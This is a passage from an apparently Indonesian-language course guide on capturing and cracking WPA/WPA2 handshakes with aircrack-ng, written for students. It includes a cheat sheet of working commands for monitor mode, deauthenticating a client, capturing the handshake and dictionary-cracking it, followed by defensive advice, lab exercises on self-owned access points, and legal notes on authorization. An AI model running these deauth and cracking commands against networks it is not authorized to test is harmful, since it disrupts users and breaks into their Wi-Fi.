+**Output:**
+```
+WPA Key Nonce: fb263fe6040ce65f536ca15c47dc23b95f400aa141d15efdd6f401c080ca88aa
+WPA Key MIC: 43045e768cf04abaf22837ba47d187e5
+WPA Key Data Length: 28
+WPA Key Data: 301a0100000fac040100000fac040100000fac0280000000000fac06
+```
+
+**Penjelasan Data:**
+- **Nonce:** Random number untuk generate encryption key
+- **MIC (Message Integrity Check):** Hash untuk verifikasi password
+- **Key Data:** Berisi RSN Information Element (cipher info)
+
+---
+
+### **STEP 10: KEMBALIKAN KE MODE NORMAL**
+
+```bash
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Restart NetworkManager
+sudo systemctl start NetworkManager
+
+# Atau restart network service
+sudo service network-manager restart
+```
+
+---
+
+**Verifikasi:**
+```bash
+iwconfig
+```
+
+**Output normal:**
+```
+wlan0     IEEE 802.11  ESSID:"My-WiFi"  
+          Mode:Managed  Frequency:2.437 GHz  Access Point: AA:BB:CC:DD:EE:FF
+```
+
+✅ Mode kembali ke **Managed** = Normal client mode
+
+---
+
+## 🎓 PENJELASAN TEKNIS WPA/WPA2 HANDSHAKE
+
+### **Apa itu 4-Way Handshake?**
+
+Proses autentikasi WPA/WPA2 menggunakan **4-Way Handshake** untuk:
+1. Verifikasi bahwa client dan AP tahu password (PSK)
+2. Generate fresh encryption keys (tidak reuse keys)
+3. Establish secure communication channel
+
+```
+Client                                  Access Point
+  |                                          |
+  |<------ M1: ANonce (AP Nonce) -----------|
+  |                                          |
+  |------- M2: SNonce + MIC --------------->|  <- Butuh ini!
+  |                                          |
+  |<------ M3: GTK + MIC -------------------|  <- Dan ini!
+  |                                          |
+  |------- M4: ACK ------------------------->|
+  |                                          |
+  [Encrypted Communication Starts]
+```
+
+**Yang Kita Capture:**
+- **ANonce:** Random dari AP
+- **SNonce:** Random dari Client
+- **MIC:** Hash dari (PSK + ANonce + SNonce + data lain)
+
+**Cara Crack:**
+1. Ambil ANonce, SNonce, MIC dari capture
+2. Coba setiap password dari wordlist
+3. Generate MIC dengan password tebakan
+4. Bandingkan MIC hasil vs MIC asli
+5. Jika match = password ketemu!
+
+---
+
+## 📊 CHEAT SHEET LENGKAP
+
+### **Quick Commands:**
+```bash
+# 1. Enable monitor mode
+sudo airmon-ng start wlan0
+
+# 2. Scan WiFi
+sudo airodump-ng wlan0mon
+
+# 3. Capture handshake
+sudo airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon
+
+# 4. Deauth (terminal baru)
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# 5. Crack
+aircrack-ng /tmp/capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# 6. Stop monitor
+sudo airmon-ng stop wlan0mon
+```
+
+---
+
+### **Troubleshooting Umum:**
+
+| Problem | Solution |
+|---------|----------|
+| **"No wireless extensions"** | Interface bukan wireless, cek dengan `iwconfig` |
+| **"Monitor mode not supported"** | Chipset tidak support, gunakan adapter eksternal (TP-Link TL-WN722N) |
+| **"No beacon frames"** | Channel salah atau AP terlalu jauh, dekatkan adapter |
+| **"No handshake captured"** | Client tidak reconnect, coba deauth lagi atau tunggu client baru connect |
+| **"0 packets captured"** | Monitor mode tidak aktif proper, restart `airmon-ng` |
+| **"Wordlist exhausted"** | Password tidak ada di wordlist, gunakan wordlist lebih besar |
+
+---
+
+## 🛡️ DEFENSIVE MEASURES (Untuk Admin)
+
+**Cara Melindungi WiFi dari Aircrack-ng:**
+
+1. **Gunakan WPA3** (jika device support)
+   - WPA3 menggunakan SAE (Simultaneous Authentication of Equals)
+   - Tidak rentan terhadap offline dictionary attacks
+   - Resistant terhadap deauth attacks
+
+2. **Password Kuat:**
+   - Minimal 12-16 karakter
+   - Kombinasi huruf besar, kecil, angka, simbol
+   - Hindari kata dari dictionary
+   - Contoh lemah: `password123`, `admin2024`
+   - Contoh kuat: `Tr!@ng3l$M00n#2026`
+
+3. **Management Frame Protection (802.11w):**
+   - Melindungi dari deauthentication attacks
+   - Enable di router settings (jika support)
+
+4. **Hidden SSID:**
+   - Tidak 100% aman, tapi mengurangi exposure
+   - Attacker masih bisa detect dengan probe requests
+
+5. **MAC Filtering:**
+   - Hanya allow device tertentu
+   - Bisa di-bypass dengan MAC spoofing, tapi menambah layer
+
+6. **Monitoring:**
+   - Gunakan Wireless IDS (Intrusion Detection System)
+   - Monitor deauth attacks dengan tools seperti `wids-ng`
+   - Alert jika ada monitor mode terdeteksi
+
+---
+
+## 🎯 LATIHAN UNTUK MAHASISWA
+
+### **Lab Exercise 1: Basic Capture**
+1. Setup AP sendiri dengan password lemah (`12345678`)
+2. Connect device lain (HP/laptop) ke AP
+3. Capture handshake dengan airodump-ng
+4. Crack password dengan wordlist berisi password tersebut
+5. Dokumentasikan setiap step dengan screenshot
+
+### **Lab Exercise 2: Strong vs Weak Password**
+1. Test berapa lama crack password 8 karakter vs 16 karakter
+2. Bandingkan waktu dengan wordlist 1000 vs 10000 passwords
+3. Buat grafik hasil perbandingan
+
+### **Lab Exercise 3: Defensive Testing**
+1. Setup AP dengan WPA2 + MFP
+2. Coba deauth attack
+3. Amati apakah masih bisa disconnect client
+4. Dokumentasikan perbedaannya
+
+---
+
+## 📖 REFERENSI & BACAAN LANJUTAN
+
+1. **Aircrack-ng Official Wiki:** https://www.aircrack-ng.org/documentation.html
+2. **IEEE 802.11 Standard:** Protokol WiFi official
+3. **WPA2 Security:** Understanding 4-Way Handshake
+4. **Hashcat Wiki:** https://hashcat.net/wiki/
+5. **Wireless Security Research:** Papers tentang WiFi security
+
+---
+
+## ⚖️ HUKUM & REGULASI
+
+**Indonesia:**
+- **UU ITE No. 19 Tahun 2016 Pasal 30**
+  - Akses ilegal ke sistem: Pidana max 8 tahun atau denda max 800 juta
+  - Intersepsi transmisi: Pidana max 10 tahun atau denda max 800 juta
+
+**International:**
+- **Computer Fraud and Abuse Act (CFAA)** - USA
+- **Computer Misuse Act** - UK
+- **Convention on Cybercrime** - Europe
+
+**Authorized Testing:**
+- Dapatkan **written permission** dari owner
+- Document **scope of work** yang jelas
+- Lakukan dalam **isolated environment**
+- Report findings secara **responsible**
+
+---
+
+
+
+
 ---
 
 #### **PREREQUISITE KNOWLEDGE CHECKED**
